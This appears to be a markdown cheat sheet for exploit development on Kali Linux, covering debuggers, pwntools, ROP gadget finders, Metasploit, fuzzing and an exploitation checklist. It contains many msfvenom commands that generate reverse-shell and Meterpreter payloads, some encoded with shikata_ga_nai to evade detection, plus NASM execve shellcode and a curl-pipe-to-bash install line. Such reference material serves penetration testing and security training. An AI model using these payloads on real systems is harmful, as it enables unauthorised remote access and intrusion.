# BREAKER Tools - Kali Linux

> *"A craftsman is only as good as their tools. Know them intimately."*

## Debuggers & Disassemblers

### GDB (GNU Debugger)
```bash
# Basic usage
gdb ./vulnerable_binary
gdb -q ./binary                    # Quiet mode
gdb -p PID                         # Attach to process

# Common commands
(gdb) run                          # Start program
(gdb) run $(python -c 'print("A"*100)')  # Run with args
(gdb) break main                   # Set breakpoint
(gdb) break *0x08048456            # Break at address
(gdb) continue                     # Continue execution
(gdb) stepi                        # Step one instruction
(gdb) nexti                        # Step over
(gdb) info registers               # Show registers
(gdb) x/100x $esp                  # Examine memory (hex)
(gdb) x/s 0x08048000               # Examine as string
(gdb) disassemble main             # Disassemble function
(gdb) set {int}0x08048000 = 0x90   # Write to memory
(gdb) pattern create 500           # Create pattern (PEDA)
(gdb) pattern offset 0x41416141    # Find offset (PEDA)
```

### GDB Enhancements

#### PEDA (Python Exploit Development Assistance)
```bash
# Install
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit

# PEDA commands
gdb-peda$ checksec                 # Check security features
gdb-peda$ pattern create 500       # Create cyclic pattern
gdb-peda$ pattern offset $eip      # Find offset
gdb-peda$ vmmap                    # Show memory map
gdb-peda$ elfheader                # Show ELF headers
gdb-peda$ dumpargs                 # Dump function arguments
gdb-peda$ dumprop                  # Dump ROP gadgets
gdb-peda$ ropgadget                # Search ROP gadgets
gdb-peda$ searchmem "/bin/sh"      # Search memory
gdb-peda$ skeleton                 # Generate exploit skeleton
```

#### GEF (GDB Enhanced Features)
```bash
# Install
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"

# GEF commands
gef> checksec                      # Security checks
gef> pattern create 500            # Cyclic pattern
gef> pattern search                # Find pattern offset
gef> vmmap                         # Memory mapping
gef> heap chunks                   # Heap analysis
gef> heap bins                     # Heap bins
gef> got                           # Show GOT entries
gef> rop                           # Find ROP gadgets
gef> search-pattern "AAAA"         # Search memory
gef> format-string-helper          # Format string helper
```

#### pwndbg
```bash
# Install
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# pwndbg commands
pwndbg> checksec                   # Check binary protections
pwndbg> cyclic 500                 # Create pattern
pwndbg> cyclic -l 0x6161616c       # Find offset
pwndbg> vmmap                      # Memory map
pwndbg> got                        # GOT table
pwndbg> plt                        # PLT table
pwndbg> rop                        # ROP gadgets
pwndbg> heap                       # Heap overview
pwndbg> bins                       # Heap bins
pwndbg> canary                     # Show canary value
```

### Radare2
```bash
# Open binary
r2 ./binary
r2 -d ./binary                     # Debug mode
r2 -A ./binary                     # Auto-analyze

# Commands
[0x08048000]> aaa                  # Analyze all
[0x08048000]> afl                  # List functions
[0x08048000]> pdf @main            # Disassemble main
[0x08048000]> s main               # Seek to main
[0x08048000]> VV                   # Visual mode
[0x08048000]> iS                   # Sections
[0x08048000]> iz                   # Strings in data
[0x08048000]> /R pop rdi           # Search ROP gadget
[0x08048000]> e search.in=dbg.maps # Search in loaded maps
[0x08048000]> pxw 100 @ esp        # Hex dump at ESP
```

### Ghidra
```bash
# Start Ghidra
ghidraRun

# Key features
# - Auto-analysis and decompilation
# - Cross-references
# - Function graphs
# - Scripting support (Java/Python)
# - Patch binaries
```

## Exploit Frameworks

### Metasploit Framework
```bash
# Start console
msfconsole

# Search for exploits
msf6> search type:exploit platform:linux
msf6> search cve:2021
msf6> search name:buffer

# Use an exploit
msf6> use exploit/linux/local/[exploit_name]
msf6> show options
msf6> set RHOSTS target_ip
msf6> set LHOST attacker_ip
msf6> set PAYLOAD linux/x86/shell_reverse_tcp
msf6> exploit

# Generate payloads
msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -f c
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/shell_reverse_tcp -b '\x00\x0a\x0d' -f c  # With bad chars

# List encoders
msfvenom -l encoders

# Encode payload
msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -e x86/shikata_ga_nai -i 3 -f c
```

### pwntools (Python)
```python
#!/usr/bin/env python3
from pwn import *

# Context setup
context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'debug'

# Connect to target
p = process('./vulnerable')        # Local process
p = remote('target.com', 1337)     # Remote target
p = gdb.debug('./vulnerable')      # With GDB

# Receive and send
p.recvuntil(b'>')                  # Receive until
p.recv()                           # Receive all
p.recvline()                       # Receive line
p.send(b'data')                    # Send data
p.sendline(b'data')                # Send with newline
p.sendafter(b'>', b'data')         # Send after receiving

# Pattern generation
pattern = cyclic(500)              # Generate pattern
offset = cyclic_find(0x61616161)   # Find offset

# Packing
p32(0xdeadbeef)                    # Pack 32-bit
p64(0xdeadbeef)                    # Pack 64-bit
u32(b'\xef\xbe\xad\xde')           # Unpack 32-bit
u64(b'\xef\xbe\xad\xde\x00\x00\x00\x00')  # Unpack 64-bit

# ELF handling
elf = ELF('./vulnerable')
elf.symbols['main']                # Get symbol address
elf.got['printf']                  # GOT entry
elf.plt['system']                  # PLT entry
elf.search(b'/bin/sh').__next__()  # Search string

# ROP
rop = ROP(elf)
rop.call('system', [next(elf.search(b'/bin/sh'))])
rop.chain()                        # Get ROP chain bytes

# Shellcode
shellcode = asm(shellcraft.sh())   # Generate /bin/sh shellcode
shellcode = asm(shellcraft.amd64.linux.sh())  # 64-bit

# Interactive shell
p.interactive()
```

### ROPgadget
```bash
# Find gadgets
ROPgadget --binary ./binary

# Search specific gadgets
ROPgadget --binary ./binary --only "pop|ret"
ROPgadget --binary ./binary --ropchain     # Auto-generate chain

# Filter gadgets
ROPgadget --binary ./binary --only "pop|ret" | grep "rdi"

# Multiple binaries
ROPgadget --binary ./binary --binary /lib/x86_64-linux-gnu/libc.so.6
```

### ropper
```bash
# Find gadgets
ropper --file ./binary

# Search gadgets
ropper --file ./binary --search "pop rdi"
ropper --file ./binary --search "mov [rax], rdx"

# Generate ROP chain
ropper --file ./binary --chain execve

# Semantic search
ropper --file ./binary --semantic "reg32 = 0"
```

### one_gadget
```bash
# Find one-gadget RCE in libc
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# With constraints output
one_gadget -l 2 /lib/x86_64-linux-gnu/libc.so.6
```

## Shellcode Tools

### msfvenom Payloads
```bash
# Linux shellcode
msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -f c
msfvenom -p linux/x86/exec CMD=/bin/sh -f c
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f c

# Windows shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f c
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f c
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f c

# Staged vs stageless
msfvenom -p windows/shell/reverse_tcp ...      # Staged
msfvenom -p windows/shell_reverse_tcp ...      # Stageless

# With encoder
msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -e x86/shikata_ga_nai -f c

# Bad character avoidance
msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -b '\x00\x0a\x0d' -f c

# Output formats
-f c                               # C code
-f python                          # Python
-f raw                             # Raw binary
-f elf                             # ELF executable
-f exe                             # Windows EXE
```

### Custom Shellcode
```nasm
; Linux x86 execve("/bin/sh")
section .text
global _start
_start:
    xor eax, eax
    push eax
    push 0x68732f2f      ; "//sh"
    push 0x6e69622f      ; "/bin"
    mov ebx, esp
    push eax
    push ebx
    mov ecx, esp
    mov al, 11           ; execve syscall
    int 0x80
```

```bash
# Compile shellcode
nasm -f elf32 shellcode.asm -o shellcode.o
ld -m elf_i386 shellcode.o -o shellcode

# Extract bytes
objdump -d shellcode | grep -Po '\s\K[a-f0-9]{2}(?=\s)' | sed 's/^/\\x/g' | tr -d '\n'

# Or use pwntools
from pwn import *
print(asm(shellcraft.i386.linux.sh()).hex())
```

## Exploit Discovery

### searchsploit
```bash
# Search Exploit-DB
searchsploit apache 2.4
searchsploit -t wordpress             # Title only
searchsploit -e windows smb           # Exact match

# Copy exploit
searchsploit -m 42315                 # Copy to current dir
searchsploit -p 42315                 # Show full path

# Update database
searchsploit -u

# Output formats
searchsploit apache -j                # JSON output
searchsploit apache -w                # Show URL
```

### CVE Tools
```bash
# Search CVE database
cve-search -p apache

# NVD API
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=apache"

# CVE Details
# https://www.cvedetails.com/
```

## Binary Analysis

### checksec
```bash
# Check binary protections
checksec --file=./binary
checksec --proc=PID

# Output example:
# RELRO: Full RELRO
# Stack: Canary found
# NX: NX enabled
# PIE: PIE enabled
```

### readelf
```bash
# ELF header
readelf -h ./binary

# Section headers
readelf -S ./binary

# Program headers
readelf -l ./binary

# Symbols
readelf -s ./binary

# Dynamic section
readelf -d ./binary

# Relocations
readelf -r ./binary
```

### objdump
```bash
# Disassemble
objdump -d ./binary
objdump -D ./binary                   # All sections
objdump -M intel -d ./binary          # Intel syntax

# Headers
objdump -x ./binary

# Dynamic symbols
objdump -T ./binary
```

### strings
```bash
# Extract strings
strings ./binary
strings -n 10 ./binary                # Min length 10
strings -e l ./binary                 # Little-endian
strings -a ./binary                   # All sections
```

### ltrace/strace
```bash
# Library calls
ltrace ./binary
ltrace -p PID

# System calls
strace ./binary
strace -p PID
strace -f ./binary                    # Follow forks
strace -e read,write ./binary         # Filter syscalls
```

## Fuzzing

### AFL++ (American Fuzzy Lop)
```bash
# Compile with AFL
afl-gcc -o target target.c
afl-clang-fast -o target target.c     # LLVM mode

# Create input corpus
mkdir in out
echo "seed" > in/seed

# Run fuzzer
afl-fuzz -i in -o out ./target @@

# Parallel fuzzing
afl-fuzz -i in -o out -M fuzzer01 ./target @@
afl-fuzz -i in -o out -S fuzzer02 ./target @@
```

### ASAN (AddressSanitizer)
```bash
# Compile with ASAN
gcc -fsanitize=address -g target.c -o target

# Run and detect memory errors
./target
```

## Quick Reference

### Exploitation Checklist
```
[ ] Check protections (checksec)
[ ] Find vulnerability (fuzzing/analysis)
[ ] Calculate offset to EIP/RIP
[ ] Identify bad characters
[ ] Find JMP ESP or ROP gadgets
[ ] Generate/encode payload
[ ] Test exploit
[ ] Handle ASLR/DEP if needed
```

### Common Commands
```bash
# Generate pattern
msf-pattern_create -l 500
msf-pattern_offset -q 0x41416141

# Find JMP ESP
msf-nasm_shell
nasm> jmp esp
# Returns: FFE4

# Search for FFE4 in binary
objdump -d binary | grep "ff e4"
```
